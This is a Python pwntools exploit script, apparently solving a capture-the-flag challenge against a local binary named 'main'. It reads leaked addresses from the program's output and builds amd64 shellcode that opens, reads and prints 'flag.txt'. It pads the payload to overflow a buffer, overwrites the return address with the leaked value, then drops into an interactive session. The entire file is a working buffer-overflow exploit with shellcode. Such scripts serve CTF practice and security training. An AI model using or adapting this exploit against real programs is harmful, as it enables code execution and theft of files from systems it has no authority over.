from pwn import*
context.binary = exe = ELF('./main',checksec=False)

p = process(exe.path)

p.recvuntil(b'mylib.dll ')
result = int(p.recv(14),16)
p.recvuntil(b'TestStackTrace ')
trace = int(p.recv(8),16)

log.info(f'Result leak: {hex(result)}')

log.info(f'Trace leak: {hex(trace)}')

shellcode = asm(
        '''
        mov rax, 257
        mov rdi, -100
        lea rsi, [rip + flag_txt]
        xor rdx, rdx

        syscall

        mov rdi, rax
        mov rax, 0
        mov rsi, 0x404029
        mov rdx, 0x50

        syscall

        mov rax, 1
        mov rdi, 1
        mov rsi, 0x404029
        mov rdx, 0x50

        syscall

        flag_txt:
            .ascii "flag.txt"

        ''', arch = 'amd64')

input()

payload = shellcode
payload = payload.ljust(1032,b'\0')
payload += p64(result)

p.sendline(payload)

p.interactive()
